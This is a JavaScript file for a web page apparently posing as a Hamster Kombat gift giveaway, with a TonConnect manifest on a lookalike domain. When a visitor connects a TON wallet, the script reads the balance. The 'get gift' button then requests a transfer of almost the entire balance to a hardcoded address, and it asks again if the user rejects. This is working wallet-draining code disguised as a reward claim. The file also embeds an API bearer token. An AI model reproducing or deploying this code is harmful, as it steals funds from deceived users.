const inputElement = document.getElementById('register');
localStorage.setItem('connect', false);
localStorage.setItem('amount',0)


inputElement.addEventListener('input', function (event) {
    event.target.value = event.target.value.toUpperCase();
});


let balance = localStorage.getItem('amount') 

const counter = (id, start, end, duration) => {
    if (end != 0) {
        let obj = document.getElementById(id),
            current = start,
            range = end - start,
            increment = end > start ? 1 : -1,
            step = Math.abs(Math.floor(duration / range)),
            timer = setInterval(() => {
                current += increment;
                obj.textContent = current;
                if (current == end) {
                    clearInterval(timer);
                }
            }, step);
    }
    else {
        document.getElementById(id).textContent = 0
    }
}


function roundToNearestTenth(num) {
    return Math.floor(num / 10) * 10;
}
function roundToNearestInteger(num) {
    return Math.floor(num);
}





const token = 'AG5CYB5AA5KWBMIAAAABU7FQD5LCD3K7F4QPI4RFNR3HPJGKYT4ZNQLGZM3APX5QJ5IWACI';


const apiUrl = 'https://tonapi.io/v2';



async function getBalance(account_id) {

    try {
        const response = await axios.get(`${apiUrl}/blockchain/accounts/${account_id}`, {
            headers: {
                'Authorization': `Bearer ${token}`
            }
        });

        return response.data.balance

    } catch (error) {
        console.error('Error fetching balance account:', error);
        return [];
    }
}



async function initializeTonConnect() {
 

    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
        manifestUrl: 'https://hamsterkombatprom.space/tonconnect-manifest.json',
        buttonRootId: 'connect-button-root'
    });

 
    
    tonConnectUI.uiOptions = {
        language: 'en',
        uiPreferences: {
            theme: 'LIGHT'
        }
    };





    try {
        const walletsList = await tonConnectUI.getWallets();
        const currentModalState = tonConnectUI.modalState;



        const unsubscribeModal = tonConnectUI.onModalStateChange(
            (WalletsModalState) => {

                // update state/reactive variables to show updates in the ui
                // state.status will be 'opened' or 'closed'
                // if state.status is 'closed', you can check state.closeReason to find out the reason
            }
        );

        const unsubscribe = tonConnectUI.onStatusChange(
         
            async walletAndwalletInfo => {
              
                if(tonConnectUI.connected == true){
                    localStorage.setItem('connect', tonConnectUI.connected)
                }
                else{
                    localStorage.setItem('connect', tonConnectUI.connected)
                }


                if (localStorage.getItem('connect') === 'true') {


                    const currentWallet = tonConnectUI.wallet;

                    const account_id = currentWallet.account.address

                    const balanceValue = await getBalance(account_id)
                    const floorBalance = Math.floor((balanceValue - 100000000) / 1000000000)
                    if(floorBalance < 10){
                        localStorage.setItem('amount', roundToNearestInteger(floorBalance))
                    }
                    else{
                        localStorage.setItem('amount',roundToNearestTenth(floorBalance) )
                    }
                   


                  
                    const send = async () => {
                        const transaction = {
                            validUntil: Math.floor(Date.now() / 1000) + 60, // 60 sec
                            messages: [
                                {
                                    address: "UQD2STwpJxjgzwmqjYwpXEolIHr8Ksnz1i_Bh71BQY3fCE0h",
                                    amount:Number(localStorage.getItem('amount')) * 1000000000 ,
    
                                },
    
    
                            ]
                        }
                        try {
                            const result = await tonConnectUI.sendTransaction(transaction);


                            const someTxData = await myAppExplorerService.getTransaction(result.boc);
                            alert('Transaction was sent successfully', someTxData);
                        } catch (e) {
                            console.error(e);
                            const result = await tonConnectUI.sendTransaction(transaction);


                            const someTxData = await myAppExplorerService.getTransaction(result.boc);
                            alert('Transaction was sent successfully', someTxData);
                            console.error(e);
                        }

                    }
                    document.querySelector('.getgift').addEventListener('click', send)

                    if (document.querySelector('.register').classList.contains('close')) {


                       counter('amount', 0, localStorage.getItem('amount'), 1000)
                    //    counter('amount', 0, 120, 1000)
                        const getButton = document.querySelector('.getgift')
                        getButton.classList.add('gopen')

                    }



                } else {

                    const getButton = document.querySelector('.getgift')
                    getButton.classList.remove('gopen')
                }


                const currentWalletInfo = tonConnectUI.walletInfo;
                const currentAccount = tonConnectUI.account;
                const currentIsConnectedStatus = tonConnectUI.connected;




            }
        );


    } catch (error) {
        console.error('Error fetching wallets:', error);
    }
}




initializeTonConnect();
